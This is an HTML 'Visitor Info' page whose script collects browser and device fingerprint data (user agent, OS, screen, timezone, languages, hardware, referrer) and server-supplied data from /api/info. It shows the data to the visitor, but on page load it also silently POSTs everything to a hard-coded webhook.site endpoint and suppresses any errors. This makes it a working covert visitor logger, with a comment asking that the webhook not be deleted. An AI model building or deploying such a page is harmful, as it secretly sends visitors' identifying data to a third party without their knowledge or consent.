<!DOCTYPE html>
<html>
<head>
  <title>Visitor Info</title>
  <style>
    body {
      font-family: monospace;
      background: #111;
      color: #0f0;
      padding: 20px;
    }
    pre {
      white-space: pre-wrap;
    }
  </style>
</head>
<body>
  <h2>Visitor Information</h2>
  <pre id="output">Loading...</pre>

  <script>
    //dont nuke pls
    const WEBHOOK_URL = "https://webhook.site/5c51d1ab-3a36-41a6-871c-d06526fa191d";

    function getBrowserInfo() {
      const ua = navigator.userAgent;

      let browser = "Unknown";
      if (ua.includes("Firefox")) browser = "Firefox";
      else if (ua.includes("Edg")) browser = "Edge";
      else if (ua.includes("Chrome")) browser = "Chrome";
      else if (ua.includes("Safari")) browser = "Safari";

      let os = "Unknown";
      if (ua.includes("Win")) os = "Windows";
      else if (ua.includes("Mac")) os = "MacOS";
      else if (ua.includes("Linux")) os = "Linux";
      else if (ua.includes("Android")) os = "Android";
      else if (ua.includes("iPhone")) os = "iOS";

      return { browser, os };
    }

    async function collectInfo() {
      try {
        const serverData = await fetch("/api/info").then(r => r.json());
        const { browser, os } = getBrowserInfo();

        const clientData = {
          browser,
          os,
          screen: {
            width: screen.width,
            height: screen.height,
            color_depth: screen.colorDepth
          },
          timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
          language: navigator.language,
          languages: navigator.languages,
          cookies_enabled: navigator.cookieEnabled,
          online: navigator.onLine,
          referrer: document.referrer || "None",
          device_memory_gb: navigator.deviceMemory || "Unknown",
          cpu_cores: navigator.hardwareConcurrency || "Unknown",
          platform: navigator.platform,
          local_time: new Date().toString()
        };

        const finalData = {
          ...serverData,
          client: clientData
        };


        document.getElementById("output").textContent =
          JSON.stringify(finalData, null, 2);
        if (WEBHOOK_URL && WEBHOOK_URL.startsWith("http")) {
          fetch(WEBHOOK_URL, {
            method: "POST",
            headers: {
              "Content-Type": "application/json"
            },
            body: JSON.stringify(finalData)
          }).catch(() => {});
        }

      } catch (err) {
        document.getElementById("output").textContent =
          "Failed to load visitor info.";
      }
    }

    collectInfo();
  </script>
</body>
</html>
